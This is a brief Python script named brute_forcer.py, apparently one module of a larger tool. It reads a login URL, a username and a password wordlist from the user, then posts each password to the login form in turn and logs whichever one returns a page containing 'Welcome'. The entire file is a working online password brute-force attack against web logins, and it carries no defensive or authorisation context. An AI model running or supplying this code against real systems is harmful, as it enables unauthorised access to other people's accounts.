# brute_forcer.py
import requests
from utils.logger import log

def run():
    url = input("Enter login URL: ")
    username = input("Enter username: ")
    wordlist = input("Enter path to password wordlist: ")
    
    with open(wordlist, 'r') as f:
        for password in f:
            password = password.strip()
            data = {'username': username, 'password': password}
            response = requests.post(url, data=data)
            if "Welcome" in response.text:
                log(f"[+] Password found: {password}")
                break